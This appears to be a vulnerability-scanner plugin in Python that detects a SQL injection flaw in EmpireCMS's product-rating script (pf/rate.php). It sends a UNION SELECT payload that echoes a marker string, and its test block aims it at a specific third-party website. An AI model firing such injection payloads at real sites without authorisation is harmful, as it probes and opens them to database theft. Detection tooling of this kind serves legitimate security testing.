#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 帝国CMS(EmpireCMS)商品评分插件注入漏洞

def assign(service, arg):
    if service == "empire_cms":
        return True, arg

def audit(arg):
    payload = 'pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,0x747971,0x23)--' 
    target = arg + payload 
    code, head,res, errcode, _   = curl.curl2(target) 
    if code==200 and '#tyq#' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('empire_cms', 'http://www.mongol.cn/')[1])